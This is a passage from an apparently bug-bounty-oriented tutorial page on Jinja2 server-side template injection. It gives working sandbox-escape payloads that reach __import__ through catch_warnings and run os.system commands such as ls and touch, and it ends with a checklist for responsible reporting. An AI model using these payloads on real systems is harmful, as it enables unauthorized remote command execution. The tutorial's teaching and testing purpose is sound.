+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>display_name<span style="color:#960050;background-color:#1e0010">?</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{__import__(&#39;os&#39;).system(&#39;ls&#39;)}}&#34;</span>
+</span></span><span style="display:flex;"><span>Host: example<span style="color:#f92672">.</span>com
+</span></span></code></pre></div><p>If you submit this payload to the application, you will probably see another error returned: <code>jinja2.exceptions.UndefinedError: '**import**' is undefined</code></p>
+<p>Most template engines will block the use of dangerous functionality such as import or make an <strong>allowlist</strong> that allows users to perform only certain operations
+within the template. To escape these limitations of Jinja2, you need to take advantage of <strong>Python sandbox-escape techniques</strong>.</p>
+<h2 id="escaping-the-sandbox-by-using-python-built-in-functions">Escaping the Sandbox by Using Python Built-in Functions</h2>
+<p>One of these techniques involves using Python’s built-in functions. When you’re barred from importing certain useful modules or importing anything at all, you need to investigate functions that are <strong>already imported</strong> by
+Python by default. For example, the following GET request contains Python code that lists the Python classes available:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>display_name<span style="color:#960050;background-color:#1e0010">?</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{[].__class__.__bases__[0].__subclasses__()}}&#34;</span>
+</span></span><span style="display:flex;"><span>Host: example<span style="color:#f92672">.</span>com
+</span></span></code></pre></div><p>When you submit this payload into the template injection endpoint, you should see a list of classes like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">type</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>weakref<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>weakcallableproxy<span style="color:#e6db74">&#39;&gt;, &lt;class </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;weakproxy&#39;</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">int</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytearray<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytes<span style="color:#e6db74">&#39;&gt;, &lt;class </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;list&#39;</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">NoneType</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>NotImplementedType<span style="color:#e6db74">&#39;&gt;, &lt;class </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;traceback&#39;</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">super</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>range<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>dict<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>dict_
+</span></span><span style="display:flex;"><span>keys<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>dict_values<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>dict_items<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>dict_reverse
+</span></span><span style="display:flex;"><span>keyiterator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>dict_reversevalueiterator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>dict_reverseitem
+</span></span><span style="display:flex;"><span>iterator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>odict_iterator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>set<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>str<span style="color:#e6db74">&#39;&gt;, &lt;class </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;slice&#39;</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">staticmethod</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>complex<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>float<span style="color:#e6db74">&#39;&gt;, &lt;class </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;frozenset&#39;</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">property</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>managedbuffer<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>memory
+</span></span><span style="display:flex;"><span>view<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>tuple<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>enumerate<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>reversed<span style="color:#e6db74">&#39;&gt;, &lt;class </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;stderrprinter&#39;</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">code</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>frame<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>builtin_function_
+</span></span><span style="display:flex;"><span>or_method<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>method<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>function<span style="color:#e6db74">&#39;&gt;...]</span>
+</span></span></code></pre></div><p>To better understand what’s happening here, let’s break down this payload a bit: <code>[].**class**.**bases**[0].**subclasses**()</code></p>
+<p>It first creates an empty list and calls its <strong>class</strong> attribute, which refers to the class the instance belongs to, list: <code>[].**class**</code></p>
+<p>Then you can use the <strong>bases</strong> attribute to refer to the base classes of the list class: <code>[].**class**.**bases**</code></p>
+<p>This attribute will return a tuple (which is just an ordered list in Python) of all the base classes of the class list. A base class is a class that the current
+class is built from; list has a base class called object. Next, we need to access the object class by referring to the first item in the tuple: <code>[].**class**.**bases**[0]</code></p>
+<p>Finally, we use <strong>subclasses</strong>() to refer to all the subclasses of the class: <code>[].**class**.**bases**[0].**subclasses**()</code></p>
+<p>Now, we simply need to look for a method in one of these classes that we can use for command execution. Let’s explore one possible way of executing code. <strong>Not all the templates have the same classes</strong></p>
+<p>The <strong>import</strong> function, which can be used to import modules, is one of Python’s built-in functions. But since Jinja2 is blocking its direct access, you
+will need to access it via the <strong>builtins module</strong>. This module provides direct access to all of Python’s built-in classes and functions. Most Python modules
+have <strong>builtins</strong> as an attribute that refers to the built-in module, so you can recover the builtins module by referring to the <strong>builtins</strong> attribute.
+Within all the subclasses in <code>[].**class**.**bases**[0].**subclasses**()</code>, there is a class named <code>catch_warnings</code>. This is the subclass we’ll use to construct our exploit.</p>
+<p>To find the <code>catch_warnings</code> subclass, inject a loop into the template code to look for it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>} <span style="color:#75715e">##loop goes through all the classes in [].__class__.__bases__[0].__subclasses__()</span>
+</span></span><span style="display:flex;"><span>	{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>} <span style="color:#75715e">## finds the one with the string catch_warnings in its name</span>
+</span></span><span style="display:flex;"><span>	{{x()}} <span style="color:#75715e">## Then it instantiates an object of that class</span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endfor<span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>Finally, we use the reference to the module to refer to the builtins module:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__}}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endfor<span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>You should see a list of built-in classes and functions returned, including the function <strong>import</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#e6db74">&#39;__name__&#39;</span>: <span style="color:#e6db74">&#39;builtins&#39;</span>, <span style="color:#e6db74">&#39;__doc__&#39;</span>: <span style="color:#e6db74">&#34;Built-in functions, exceptions, and other objects.</span><span style="color:#ae81ff">\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">nNoteworthy: None is the &#39;nil&#39; object; Ellipsis represents &#39;...&#39; in slices.&#34;</span>, <span style="color:#e6db74">&#39;__package__&#39;</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;__loader__&#39;</span>: <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">_frozen_importlib</span><span style="color:#f92672">.</span>BuiltinImporter<span style="color:#e6db74">&#39;&gt;, &#39;</span>__spec__<span style="color:#e6db74">&#39;: ModuleSpec(name=</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;builtins&#39;</span>, loader<span style="color:#f92672">=&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">_frozen_importlib</span><span style="color:#f92672">.</span>BuiltinImporter<span style="color:#e6db74">&#39;&gt;), &#39;</span>__build_class__<span style="color:#e6db74">&#39;: &lt;built-in </span>
+</span></span><span style="display:flex;"><span>function __build_class__<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;__import__&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function __import__<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;abs&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span>infunction abs<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;all&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function all<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;any&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function any<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;ascii&#39;</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function ascii<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;bin&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function bin<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;breakpoint&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function 
+</span></span><span style="display:flex;"><span>breakpoint<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;callable&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function callable<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;chr&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function chr<span style="color:#f92672">&gt;</span>, 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;compile&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function compile<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;delattr&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function delattr<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;dir&#39;</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function dir<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;divmod&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function divmod<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function 
+</span></span><span style="display:flex;"><span>eval<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function exec<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;format&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function format<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;getattr&#39;</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function getattr<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;globals&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function globals<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;hasattr&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> 
+</span></span><span style="display:flex;"><span>function hasattr<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;hash&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function hash<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;hex&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function hex<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;id&#39;</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function id<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;input&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function input<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;isinstance&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function 
+</span></span><span style="display:flex;"><span>isinstance<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;issubclass&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function issubclass<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;iter&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function iter<span style="color:#f92672">&gt;</span>, 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;len&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function len<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;locals&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function locals<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;max&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function 
+</span></span><span style="display:flex;"><span>max<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;min&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function min<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;next&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function next<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;oct&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> 
+</span></span><span style="display:flex;"><span>function oct<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;ord&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function ord<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;pow&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function pow<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;print&#39;</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function print<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;repr&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function repr<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;round&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function 
+</span></span><span style="display:flex;"><span>round<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;setattr&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function setattr<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;sorted&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function sorted<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;sum&#39;</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function sum<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;vars&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function vars<span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;None&#39;</span>: <span style="color:#66d9ef">None</span>, <span style="color:#e6db74">&#39;Ellipsis&#39;</span>: Ellipsis, 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;NotImplemented&#39;</span>: NotImplemented, <span style="color:#e6db74">&#39;False&#39;</span>: <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">&#39;True&#39;</span>: <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">&#39;bool&#39;</span>: <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">bool</span><span style="color:#e6db74">&#39;&gt;, </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;memoryview&#39;</span>: <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">memoryview</span><span style="color:#e6db74">&#39;&gt;, &#39;</span>bytearray<span style="color:#e6db74">&#39;: &lt;class &#39;</span>bytearray<span style="color:#e6db74">&#39;&gt;, &#39;</span>bytes<span style="color:#e6db74">&#39;: &lt;class &#39;</span>bytes<span style="color:#e6db74">&#39;&gt;, </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;classmethod&#39;</span>: <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">classmethod</span><span style="color:#e6db74">&#39;&gt;, ...}</span>
+</span></span></code></pre></div><p>We now have a way to access the import functionality! Since the builtin classes and functions are stored in a Python dictionary, you can access
+the <strong>import</strong> function by referring to the key of the function’s entry in the dictionary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>]}}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endfor<span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>You can import a module with <strong>import</strong> by providing the name of that module as an argument. Here, let’s import the OS module so we can access the <code>system()</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;ls&#39;</span>)}}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endfor<span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>This command lists the contents of the current directory. You’ve achieved command execution! Now, you should be able to execute arbitrary system commands with this template injection</p>
+<h1 id="submitting-payloads-for-testing">Submitting Payloads for Testing</h1>
+<p>Use the touch command to create a file with the specified name in the current directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;warning&#39;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;touch template_injection_by_slax</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>txt<span style="color:#e6db74">&#39;)}}</span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>endfor<span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>If you are interested in learning more about <strong>sandbox escapes,</strong> these articles discuss the topic in more detail  :</p>
+<ul>
+<li>CTF Wiki, <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/</a></li>
+<li>HackTricks, <a href="https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/">https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/</a></li>
+<li>Programmer Help, <a href="https://programmer.help/blogs/python-sandbox-escape.html">https://programmer.help/blogs/python-sandbox-escape.html</a></li>
+</ul>
+<h1 id="automating-template-injection">Automating Template Injection</h1>
+<p>One tool built to automate the template injection process, called <em><strong>tplmap</strong></em>  <a href="https://github.com/epinna/tplmap/">https://github.com/epinna/tplmap/</a> can scan for template injections,
+determine the template engine in use, and construct exploits. While this tool does not support every template engine, it should provide you with a good starting point for the most popular ones.</p>
+<h1 id="finding-your-first-template-injection">Finding Your First Template Injection!</h1>
+<ol>
+<li>Identify any opportunity to submit user input to the application. Mark down candidates of template injection for further inspection.</li>
+<li>Detect template injection by submitting test payloads. You can use either payloads that are designed to induce errors, or engine-specific payloads designed to be evaluated by the template engine.</li>
+<li>If you find an endpoint that is vulnerable to template injection, determine the template engine in use. This will help you build an exploit specific to the template engine.</li>
+<li>Research the template engine and programming language that the target is using to construct an exploit.</li>
+<li>Try to escalate the vulnerability to arbitrary command execution.</li>
+<li>Create a proof of concept that does not harm the targeted system. A good way to do this is to execute touch template_injection_by_YOUR_NAME.txt to create a specific proof-of-concept file.</li>
+<li>Draft your first template injection report and send it to the organization!</li>
+</ol>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
